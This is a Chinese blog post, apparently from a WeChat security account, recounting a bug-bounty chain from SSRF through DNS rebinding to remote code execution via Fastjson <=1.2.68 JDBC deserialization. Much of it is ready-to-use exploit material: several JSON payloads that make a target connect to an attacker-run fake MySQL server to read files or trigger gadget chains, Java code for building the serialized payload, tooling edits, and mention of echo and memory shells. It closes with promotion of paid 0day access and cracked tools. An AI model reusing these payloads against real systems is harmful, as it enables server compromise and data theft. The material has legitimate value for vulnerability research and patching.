#  从 SSRF 到 RCE：一次众测Fastjson<=1.2.68反序列化RCE过程|挖洞技巧   
脚*猪  渗透安全HackTwo   2025-05-25 16:00  
  
**0x01 前言**  
   
  
       在某次众测过程中使用搜索引擎找到某单位部署的旁站，通过前端JS信息分析找到一处ssrf漏洞。在ssrf测试时根据提示信息得到服务端接收的数据格式为json格式，再通过构造json报错语句时服务端报错回显了fastjson版本号为1.2.58，然后寻找Fastjson 1.2.58利用链，最后RCE。很幸运利用的过程中都如预期所料没出现坑点。  
  
参考文章：  
https://xz.aliyun.com/news/17489  
  
现在只对常读和星标的公众号才展示大图推送，建议大家把**渗透安全HackTwo“设为星标”，否则可能就看不到了啦！**  
  
**末尾可领取挖洞资料文件 #渗透安全HackTwo**  
  
**0x02 漏洞详情**  
  
在渗透过程中，如果遇到一些部署了很久的老站点（比如zf、edu），利用搜索引擎和网站时光机(web.archive.org)可以发现大量历史资产。下面以百度为例，使用过程中感觉必应搜集到的信息比谷歌要多  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5vcxXGxJwvo3NmiaV5ib2KhkZp6AyFBvBibjS6muMF4IE3jqnPTWX18PcfLWBXmZC3mqhveiausH0icSA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5vcxXGxJwvo3NmiaV5ib2KhkzO7FeP1CIqyVib9SodC7hHicRTm1djM2MZC2N7rCIhI5NiaunSlExciaicg/640?wx_fmt=png&from=appmsg "")  
  
这个过程中我使用必应找到了xx系统，然后对js进行分析，找到了xxx/checkTokenByUrl接口，由于是键值对的形式，直接搜索键值xxx_CANENTER就能找到对应的参数。（漏洞修复在前端将这些接口都删了没图~~哈哈）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5vcxXGxJwvo3NmiaV5ib2Khk04HDUegmPFvu4ljusQ71xcS8aibSIdVhWblZPs182bhWoicZfZ92UFuQ/640?wx_fmt=png&from=appmsg "")  
## SSRF漏洞  
  
  
然后就找到了这三个参数，构造请求，根据参数名可以发现callBackUrl应该是接受一个url地址，将url指向个人VPS地址，接收到了请求。  
  
  
orgId=&accessToken=&callBackUrl=  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5vcxXGxJwvo3NmiaV5ib2KhkT2YeOqUADA95sPNZW4Rggic26m6Agppobjib6nHBzicuY09pVhn1ib1KeQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5vcxXGxJwvo3NmiaV5ib2Khk4neCsibzDS2hUjU4gmHd2V6dvaBqcRhNlo5pyRYLDrehNsqeKYjnCtQ/640?wx_fmt=png&from=appmsg "")  
  
到此基本可以判断此处存在SSRF了，再将url地址指向一个内网IP，根据响应时间判断通内网  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5vcxXGxJwvo3NmiaV5ib2Khkxfmu9arrJdVoQmyFovFJ5dWXvXiaopG00WomQiaJU6TPdXJyzqocDRzw/640?wx_fmt=png&from=appmsg "")  
  
根据响应包报错提示可以发现，服务端远程获取数据时，返回的数据不是map类型，也就是json。然后在VPS中，控制返回数据为json，服务端响应token失效  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5vcxXGxJwvo3NmiaV5ib2Khk0YxkWEXbtianMpETMBVrdnd2tdqkbI7Na63iaSR9EGDo2jOsmeY96fYA/640?wx_fmt=png&from=appmsg "")  
  
既然这里解析json那么就测试一下是使用jackson还是fastjson  
  
{"@type": "java.lang.AutoCloseable"  
  
{"a\x63aa":"00"}  
报错为jackson，反之fastjson  
  
  
这里使用  
  
{"@type": "java.lang.AutoCloseable"  
  
服务端直接报错返回fastjson版本（补图）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5vcxXGxJwvo3NmiaV5ib2KhkZHiaOTdtO9ia6LEUmicB21TibLafHeHT4FGmmVELozzicYdRrOda56QkAibg/640?wx_fmt=png&from=appmsg "")  
  
fastjson<=1.2.68一般使用JDBC相关利用链，但是这里我没有进行利用，直接提交报告。我赌他肯定不会完完全全修复的，果然等了几天后漏洞确认并进行了修复，但是没有完全修复。hahahaha~~  
  
## 梅开二度  
  
  
上面提到，漏洞被修复了，然后我就查看它是如何进行修复的，经过一番测试发现，传入的url地址不能为ip地址，从传入域名没有进行限制。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5vcxXGxJwvo3NmiaV5ib2KhkiaicQW2FiaTrt6VEGial495wEiarVlqtUQSOcJNPgp4JmQbMiaUqoooJunGw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5vcxXGxJwvo3NmiaV5ib2KhkxTRCuZwJibrCv19TzpBjIibvl67dicjNyqGhpjicqaa63sgt5uS0WsA9cQ/640?wx_fmt=png&from=appmsg "")  
  
这要怎么利用呢？可以使用**DNS重绑定**  
绕过限制，众所周知DNS协议的作用是域名到IP的过程，如果将域名指定为一个内网IP就能就能绕过限制。  
http://dnslog.pw/  
就有这个功能  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5vcxXGxJwvo3NmiaV5ib2KhkNIFyNMicYBvXT2QspBm9nNM1WBzdgIkaUw5onxto1rG9tdGicMjV4FMA/640?wx_fmt=png&from=appmsg "")  
  
这里可以自己申请一个域名或者使用DNS重绑定的IP指向自己的VPS（国内VPS要备案）  
  
  
那么接下来就进行fantjson反序列化测试了。  
  
# Fastjson <= 1.2.68反序列化RCE探索  
  
  
对于fastjson <= 1.2.68版本，目前常用的利用链是JDBC文件读取、JDBC反序列化、文件写入还有文件读取等，不过较通用的是JDBC文件读取、JDBC反序列化  
  
## fastjson依赖库判断  
  
  
在进行JDBC利用链探测时，首先要判断  
mysql-connector-java  
版本是多少，我这里直接使用对于的poc  
  
  
来自这篇文章：  
```
https://mp.weixin.qq.com/s/I0OdFPnRH_r1yZ04tOB-cw
```  
  
fastjson<=1.2.68 mysql-connector-java-5.1.1-5.1.49可SSRF 5.1.11至5.1.48可反序列化   
```
{
  "@type": "java.lang.AutoCloseable",
  "@type": "com.mysql.jdbc.JDBC4Connection",
  "hostToConnectTo": "YOUR_DNSLOG",
  "portToConnectTo": 3306,
  "info": {
    "user": "yso_xxx",
    "password": "pass",
    "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
    "autoDeserialize": "true",
    "NUM_HOSTS": "1"
  },
  "databaseToConnectTo": "dbname",
  "url": ""
}
```  
  
fastjson<=1.2.68 mysql-connector-java-6.0.2-6.0.3可反序列化  
```
{
  "@type": "java.lang.AutoCloseable",
  "@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",
  "proxy": {
    "connectionString": {
      "url": "jdbc:mysql://YOUR_DNSLOG:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_xxx_calc"
    }
  }
}
```  
  
fastjson<=1.2.68 mysql-connector-java-8.0.19可反序列化，>8.0.19可SSRF  
```
{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
    "proxy": {
        "@type": "com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
        "connectionUrl": {
            "@type": "com.mysql.cj.conf.url.ReplicationConnectionUrl",
            "masters": [{
                "host": ""
            }],
            "slaves": [],
            "properties": {
                "host": "YOUR DNSLOG",
                "user": "yso_xxx_calc",
                "dbname": "dbname",
                "password": "pass",
                "queryInterceptors": "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
                "autoDeserialize": "true"
            }
        }
    }
}
```  
  
另一种写法  
```
{
"@type": "java.lang.AutoCloseable",
"@type": "com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
  "proxy": {
    "@type": "com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
    "connectionUrl": {
      "@type": "com.mysql.cj.conf.url.ReplicationConnectionUrl",
      "masters": [
        {
          "host": ""
        }
      ],
      "properties": {
        "allowUrlInlocalInfile": "true",
        "allowLoadLocalInfile": "true",
        "autoDeserialize": "true",
        "dbname": "dbname",
        "host": "YOUR_DNSLOG",
        "password": "pass",
        "port": "7777",
        "queryInterceptors": "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
        "user": "win_ini"
      },
      "slaves": []
    }
  }
}
```  
## 反序列化利用  
  
  
在上面探测中，这个payload成功触发dnslog  
  
```
{
  "@type": "java.lang.AutoCloseable",
  "@type": "com.mysql.jdbc.JDBC4Connection",
  "hostToConnectTo": "YOUR_DNSLOG",
  "portToConnectTo": 3306,
  "info": {
    "user": "yso_xxx",
    "password": "pass",
    "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
    "autoDeserialize": "true",
    "NUM_HOSTS": "1"
  },
  "databaseToConnectTo": "dbname",
  "url": ""
}
```  
  
既然触发了DNSLOG，那么接下来就可以搭建一个利用Mysql服务了，用到了下面这个项目，根据使用说明书进行使用  
  
python<3.8用这个  
```
https://github.com/fnmsd/MySQL_Fake_Server
```  
  
python3.8+用这个  
```
https://github.com/clown1ay/MySQL_Fake_Server
```  
  
首先进行文件读取，user指定要读取的文件  
```
{
  "@type": "java.lang.AutoCloseable",
  "@type": "com.mysql.jdbc.JDBC4Connection",
  "hostToConnectTo": "YOUR_DNSLOG",
  "portToConnectTo": 7777,
  "info": {
    "user": "win_ini",
    "password": "pass",
    "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
    "autoDeserialize": "true",
    "NUM_HOSTS": "1"
  },
  "databaseToConnectTo": "dbname",
  "url": ""
}
```  
  
本地和目标系统都读取不成功，本地  
mysql-connector-java为5.1.47  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5vcxXGxJwvo3NmiaV5ib2KhkVV3KmPOjdkP3kPbC0iaodPbPkGWgONtcnpBm59GBlwpG154NBRz1MlQ/640?wx_fmt=png&from=appmsg "")  
  
转战反序列化，先进行DNSURL利用链探测，反序列化操作是否成功  
```
{
  "@type": "java.lang.AutoCloseable",
  "@type": "com.mysql.jdbc.JDBC4Connection",
  "hostToConnectTo": "YOUR_DNSLOG",
  "portToConnectTo": 7777,
  "info": {
    "user": "yso_URLDNS_http://YOUR_DNSLOG",
    "password": "pass",
    "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
    "autoDeserialize": "true",
    "NUM_HOSTS": "1"
  },
  "databaseToConnectTo": "dbname",
  "url": ""
}
```  
  
本地演示  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5vcxXGxJwvo3NmiaV5ib2KhkRx8lbwqpdSqRGDicMgFB1fgnmiaW7P8yvGXwPDAcwiaia3aTiaJPhn4dvww/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5vcxXGxJwvo3NmiaV5ib2Khkk9dIbjW5mgnvrUblFiat41HeibKT3XONdhkSs4brqV8XXwIllf0Iak3A/640?wx_fmt=png&from=appmsg "")  
  
既然能正常执行反序列化操作，那么下一步就需要测试命令执行。这里使用到了@Y4tacker大佬给出的利用链  
  
```
https://paper.seebug.org/2067/
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5vcxXGxJwvo3NmiaV5ib2Khk3w8Ss5y8Lia5CDgxFOicxlE0DibsYXcial7UV73k13lCSvZu3EqRS4ovwg/640?wx_fmt=png&from=appmsg "")  
## 代码微调  
## 直接拿文章中给出的代码进行修改，添加这段代码，将反序列化的内容保存到文件中。自定义执行命令  
```
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("fastjson1268.bin"));
oos.writeObject(hashMap);
oos.close();
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5vcxXGxJwvo3NmiaV5ib2KhkfdpZBNn2loyDpIiaGd6ibcUmAuPZRG8Hgepar6ALvajKQSC2Qs972b9A/640?wx_fmt=png&from=appmsg "")  
  
还要修改MySQL_Fake_Server  
项目server.py文件，get_yso_content函数的内容，让其从指定文件中读取  
```
with open(r'fastjson1268.bin','rb') as f:
    file_content = f.read()
return file_content
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5vcxXGxJwvo3NmiaV5ib2KhkSyfxsZouw4dhrNibcMibW0wyrnkaaHeaefIhHBTiaJ4qHumLOE5IN0LmQ/640?wx_fmt=png&from=appmsg "")  
  
将生成的fastjson1268.bin放到server.py文件同级目录中，运行server.py文件  
  
  
user填入yso_xxx就能触发server.py的get_yso_content函数，此时fastjson测试payload为  
```
{
  "@type": "java.lang.AutoCloseable",
  "@type": "com.mysql.jdbc.JDBC4Connection",
  "hostToConnectTo": "YOUR_DNSLOG",
  "portToConnectTo": 7777,
  "info": {
    "user": "yso_URLDNS_http://YOUR_DNSLOG",
    "password": "pass",
    "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
    "autoDeserialize": "true",
    "NUM_HOSTS": "1"
  },
  "databaseToConnectTo": "dbname",
  "url": ""
}
```  
  
很幸运系统成功触发了命令执行ping xx.dnslog.com  
  
  
到此就完成了RCE，证明漏洞危害，提交报告。  
  
## 反序列化改造  
  
  
查看Y4大佬给出的利用链可以发现，其使用的是  
TemplatesImpl  
进行动态加载字节码，那么直接将字节码改为回显马和内存马也是可以的，我将回显马编译为class文件，然后读取该文件，传入到  
_bytecodes中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5vcxXGxJwvo3NmiaV5ib2KhkrYk0AotxibWLhZiaNcibjqPHibBApEZpIyknicIriba3Nxx6JIvkPu1j5iamQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5vcxXGxJwvo3NmiaV5ib2KhkBRy34VqFZsex6c7JJrlKJCWStQjCOjWGQRtfoTdTAOfNwLIA11KYFg/640?wx_fmt=png&from=appmsg "")  
  
**0x03 总结**  
  
通过必应搜索发现目标旁站，利用前端JS分析找到 /xxx/checkTokenByUrl 接口的 SSRF 漏洞。测试中确认服务端使用 Fastjson 1.2.58 解析 JSON，报错暴露版本信息。结合 DNS 重绑定绕过修复限制，使用 Fastjson <= 1.2.68 的 JDBC 反序列化利用链，通过 MySQL_Fake_Server 实现文件读取和 RCE，最终触发命令执行（ping DNSLOG）。信息收集是 Web 该漏洞的关键，资产发现与漏洞挖掘相辅相成，成功利用需深度分析与灵活构造 payload。  
喜欢的师傅可以点赞转发支持一下谢谢！  
  
  
**0x04 内部星球VIP介绍V1.4（福利）**  
  
  
**如果你想学习更多另类渗透SRC挖洞技术/攻防/免杀/应急溯源/赏金赚取/工作内推/欢迎加入我们内部星球可获得内部工具字典和享受内部资源/内部群。**  
  
1.每周更新1day/0day漏洞刷分上分，目前已更新至3800+  
  
2.包含网上一些付费工具/BurpSuite漏洞检测插件/  
fuzz字典  
等等  
  
3.Fofa会员Ctfshow各种账号会员共享等等  
  
4.最新SRC挖掘/红队/代审视频资源等等  
  
5. .....  
  
6.详情直接点击下方链接进入了解，后台回复"   
星球  
 "获取优惠先到先得！后续资源会更丰富在加入还是低价！（即将涨价）以上仅介绍部分内容还没完！**点击下方地址全面了解👇🏻**  
  
  
**👉****点击了解加入-->>2025内部VIP星球福利介绍V1.4版本-1day/0day漏洞库及内部资源更新**  
  
  
结尾  
  
# 免责声明  
  
  
# 获取方法  
  
  
回复“**app**  
" 获取  app渗透和app抓包教程  
  
回复“**渗透字典**  
" 获取 一些字典已重新划分处理**（需要内部专属fuzz字典可加入星球获取，内部字典多年积累整理好用！持续整理中！）**  
  
回复“**书籍**  
" 获取 网络安全相关经典书籍电子版pdf  
  
# 最后必看  
  
  
      
文章中的案例或工具仅面向合法授权的企业安全建设行为，如您需要测试内容的可用性，请自行搭建靶机环境，勿用于非法行为。如  
用于其他用途，由使用者承担全部法律及连带责任，与作者和本公众号无关。  
本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用。  
如您在使用本工具或阅读文章的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。本工具或文章或来源于网络，若有侵权请联系作者删除，请在24小时内删除，请勿用于商业行为，自行查验是否具有后门，切勿相信软件内的广告！  
  
  
  
  
  
# 往期推荐  
  
  
**1.内部VIP知识星球福利介绍V1.4版本0day推送**  
  
**2.最新Nessus2025.01.06版本主机漏洞工具**  
  
**3.最新BurpSuite2024.11.2专业稳定版**  
  
**4.最新xray1.9.11高级版下载Windows/Linux**  
  
**5.最新HCL AppScan_Standard_10.8.0.28408特别版下载**  
  
渗透安全HackTwo  
  
微信号：关注公众号获取  
  
后台回复星球加入：  
知识星球  
  
扫码关注 了解更多  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq6qFFAxdkV2tgPPqL76yNTw38UJ9vr5QJQE48ff1I4Gichw7adAcHQx8ePBPmwvouAhs4ArJFVdKkw/640?wx_fmt=png "二维码")  
  
  
  
喜欢的师傅可以点赞转发支持一下  
  
